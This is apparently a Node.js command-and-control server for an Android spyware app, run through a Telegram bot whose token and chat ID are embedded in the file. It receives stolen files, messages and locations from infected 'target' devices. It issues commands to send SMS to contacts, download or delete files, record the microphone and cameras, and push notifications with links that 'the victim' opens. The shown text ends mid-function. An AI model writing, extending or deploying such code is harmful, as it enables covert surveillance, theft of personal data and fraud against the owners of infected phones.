const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8082245463:AAG1R_mdqhoDiBKh5hy9Yd9P4srZQt2CKA4'
const id = '6416283368'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    perMessageDeflate: false,
    clientTracking: true
});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()
const userSessions = new Map();

const upload = multer();
app.use(bodyParser.json());

app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Telegram Channel➩https://t.me/SLTAN_HKBLVC2017</p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    const deviceModel = req.headers.model || 'Unknown Device';
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𓃥𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${deviceModel}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

app.post("/uploadText", (req, res) => {
    const deviceModel = req.headers.model || 'Unknown Device';
    appBot.sendMessage(id, `°• 𓃥𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${deviceModel}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    const deviceModel = req.headers.model || 'Unknown Device';
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${deviceModel}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model || 'Unknown'
    const battery = req.headers.battery || 'Unknown'
    const version = req.headers.version || 'Unknown'
    const brightness = req.headers.brightness || 'Unknown'
    const provider = req.headers.provider || 'Unknown'

    ws.uuid = uuid
    ws.deviceInfo = {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        connectedAt: new Date(),
        lastPing: Date.now()
    }
    
    appClients.set(uuid, ws)

    console.log(`📱 Device connected: ${model} | Battery: ${battery} | Total: ${appClients.size}`);

    appBot.sendMessage(id,
        `°• 🤠𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙🤠\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>\n` +
        `• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙄𝘿 : <code>${uuid}</code>\n` +
        `• 𝙏𝙤𝙩𝙖𝙡 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 : <b>${appClients.size}</b>`,
        {parse_mode: "HTML"}
    )

    ws.on('message', function(data) {
        try {
            const message = data.toString();
            if (message === 'pong') {
                ws.deviceInfo.lastPing = Date.now();
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    ws.on('close', function () {
        console.log(`❌ Device disconnected: ${model} | Remaining: ${appClients.size - 1}`);
        appBot.sendMessage(id,
            `°• 😥𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙😥\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>\n` +
            `• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙄𝘿 : <code>${uuid}</code>\n` +
            `• 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘿𝙚𝙫𝙞𝙘𝙚𝙨 : <b>${appClients.size - 1}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(uuid)
    })

    ws.on('error', function (error) {
        console.error(`WebSocket error for device ${model}:`, error);
        appClients.delete(uuid);
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    if (chatId.toString() !== id) {
        appBot.sendMessage(chatId, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
        return;
    }

    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }

    handleMainCommands(message);
});

function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    const userSession = userSessions.get(message.chat.id) || {};
    const text = message.text;

    if (replyText.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
        userSession.currentNumber = text;
        userSessions.set(message.chat.id, userSession);
        appBot.sendMessage(id,
            '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴚꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
    }
    else if (replyText.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`send_message:${userSession.currentNumber}/${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentNumber;
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`send_message_to_all:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 📩𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙🗳️')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`file:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴚɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 📂𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚💥')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`delete_file:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`microphone:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`rec_camera_main:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`rec_camera_selfie:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`toast:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 📮𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
        userSession.notificationTitle = text;
        userSessions.set(message.chat.id, userSession);
        appBot.sendMessage(id,
            '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
    }
    else if (replyText.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
        if (userSession.currentDevice && userSession.notificationTitle) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`show_notification:${userSession.notificationTitle}/${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
            delete userSession.notificationTitle;
        }
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
        if (userSession.currentDevice) {
            const ws = appClients.get(userSession.currentDevice);
            if (ws && ws.readyState === webSocket.OPEN) {
                ws.send(`play_audio:${text}`);
                appBot.sendMessage(id,
                    '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙞⏳\n\n' +
                    `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                    '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                                ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                                ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                            ],
                            'resize_keyboard': true
                        }
                    }
                )
            }
            delete userSession.currentDevice;
        }
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩')) {
        const results = broadcastToAll(text);
        appBot.sendMessage(id,
            `°• 📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙍𝙚𝙨𝙪𝙡𝙩𝙨\n\n` +
            `• 𝙎𝙪𝙘𝙘𝙚𝙨𝙨: <b>${results.success}</b> devices\n` +
            `• 𝙁𝙖𝙞𝙡𝙚𝙙: <b>${results.fail}</b> devices\n` +
            `• 𝙏𝙤𝙩𝙖𝙡: <b>${appClients.size}</b> devices`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                        ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                        ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
}

function handleMainCommands(message) {
    if (message.text == '/start') {
        sendWelcomeMessage(message.chat.id);
    }
    else if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        listConnectedDevices(message.chat.id);
    }
    else if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        showDeviceSelection(message.chat.id);
    }
    else if (message.text == '📊 𝙎𝙩𝙖𝙩𝙪𝙨' || message.text == '/status') {
        showSystemStatus(message.chat.id);
    }
    else if (message.text == '📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩' || message.text == '/broadcast') {
        startBroadcastCommand(message.chat.id);
    }
}

function sendWelcomeMessage(chatId) {
    appBot.sendMessage(chatId,
        '°• 🪴𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢  Cyber Panel 🪴\n\n' +
        `• 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀: <b>${appClients.size}</b>\n` +
        '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
